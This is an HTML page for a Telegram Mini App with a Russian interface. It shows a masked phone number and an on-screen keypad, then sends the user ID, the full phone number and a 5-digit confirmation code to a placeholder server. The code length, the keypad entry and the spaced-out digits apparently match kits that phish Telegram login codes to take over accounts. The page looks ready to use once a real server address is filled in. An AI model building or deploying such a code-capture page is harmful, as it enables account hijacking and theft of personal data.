<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Ввод кода подтверждения</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: sans-serif;
            text-align: center;
            background-color: var(--tg-theme-bg-color, #fff);
            color: var(--tg-theme-text-color, #000);
            margin: 0;
            padding: 20px;
        }
        .phone-display {
            font-size: 1.2em;
            margin: 10px;
            padding: 8px;
            background-color: var(--tg-theme-secondary-bg-color, #f0f0f0);
            border-radius: 8px;
            color: var(--tg-theme-hint-color, #666);
        }
        .code-display {
            font-size: 2em;
            margin: 20px;
            padding: 10px;
            border: 1px solid var(--tg-theme-hint-color, #ccc);
            border-radius: 8px;
            min-height: 1.5em;
        }
        .keyboard {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            max-width: 300px;
            margin: 0 auto;
        }
        button {
            padding: 20px;
            font-size: 1.5em;
            background-color: var(--tg-theme-button-color, #40a7e3);
            color: var(--tg-theme-button-text-color, #fff);
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        button:active {
            opacity: 0.8;
        }
        .delete {
            background-color: var(--tg-theme-secondary-bg-color, #f0f0f0);
            color: var(--tg-theme-text-color, #000);
        }
    </style>
</head>
<body>
    <div class="phone-display" id="phoneDisplay"></div>
    <div class="code-display" id="codeDisplay"></div>
    <div class="keyboard" id="keyboard"></div>

    <script>
        const WebApp = window.Telegram?.WebApp;
        if (!WebApp) {
            alert('Telegram WebApp не доступен');
        } else {
            WebApp.ready();
        }

        // Получаем номер телефона из URL (query-параметр phone)
        const urlParams = new URLSearchParams(window.location.search);
        const phone = urlParams.get('phone') || '';

        // Получаем user_id из данных инициализации
        const userId = WebApp.initDataUnsafe?.user?.id;
        if (!userId) {
            alert('Не удалось получить user_id');
        }

        function maskPhone(phone) {
            if (!phone) return 'Номер не указан';
            const cleaned = phone.replace(/\D/g, '');
            if (cleaned.length < 4) return phone;
            const last4 = cleaned.slice(-4);
            return '****' + last4;
        }

        document.getElementById('phoneDisplay').textContent = `Номер: ${maskPhone(phone)}`;

        let code = '';
        const codeDisplay = document.getElementById('codeDisplay');
        const keyboard = document.getElementById('keyboard');

        // Создаём кнопки
        for (let i = 1; i <= 9; i++) {
            const btn = document.createElement('button');
            btn.textContent = i;
            btn.onclick = () => addDigit(i.toString());
            keyboard.appendChild(btn);
        }
        const btn0 = document.createElement('button');
        btn0.textContent = '0';
        btn0.onclick = () => addDigit('0');
        keyboard.appendChild(btn0);

        const btnDel = document.createElement('button');
        btnDel.textContent = '⌫';
        btnDel.className = 'delete';
        btnDel.onclick = deleteDigit;
        keyboard.appendChild(btnDel);

        const btnClear = document.createElement('button');
        btnClear.textContent = 'C';
        btnClear.className = 'delete';
        btnClear.onclick = clearCode;
        keyboard.appendChild(btnClear);

        function addDigit(d) {
            code += d;
            updateDisplay();
        }

        function deleteDigit() {
            code = code.slice(0, -1);
            updateDisplay();
        }

        function clearCode() {
            code = '';
            updateDisplay();
        }

        function updateDisplay() {
            codeDisplay.textContent = code.split('').join(' ') || ' ';
            // Показываем MainButton только если длина кода = 5
            if (code.length === 5) {
                WebApp.MainButton.setText('Подтвердить').show().onClick(sendCode);
            } else {
                WebApp.MainButton.hide();
            }
        }

        function sendCode() {
            if (code.length !== 5) return;

            const data = {
                user_id: userId,
                phone: phone,
                code: code
            };

            fetch('https://ваш-сервер.com/submit_code', {  // замените на ваш домен/ip
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(result => {
                if (result.status === 'ok') {
                    WebApp.close();  // успешно, закрываем приложение
                } else {
                    alert('Ошибка: ' + (result.message || result.error));
                }
            })
            .catch(error => {
                alert('Ошибка сети: ' + error);
            });
        }
    </script>
</body>
</html>
